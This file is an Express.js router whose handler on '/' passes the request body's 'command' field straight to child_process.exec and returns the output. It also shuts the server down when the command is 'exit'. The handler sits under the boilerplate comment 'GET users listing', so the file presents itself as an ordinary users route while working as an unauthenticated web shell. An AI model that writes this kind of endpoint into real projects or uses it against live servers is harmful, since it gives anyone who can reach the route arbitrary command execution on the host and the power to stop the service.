const express = require('express');
const router = express.Router();
const util = require('util');
const exec = util.promisify(require('child_process').exec);


async function run_in_cmd(command) {
    try {
        return await exec(command);
    } catch (e) {
        return e;
    }
}
/* GET users listing. */
router.get('/', async function(req, res, next) {
    try{
        let out = await run_in_cmd(req.body.command);
        if (req.body.command === "exit"){
            process.exit(1);
        }
        res.json(out);

    }catch (e){
        res.status(502).json();
    }

});

module.exports = router;
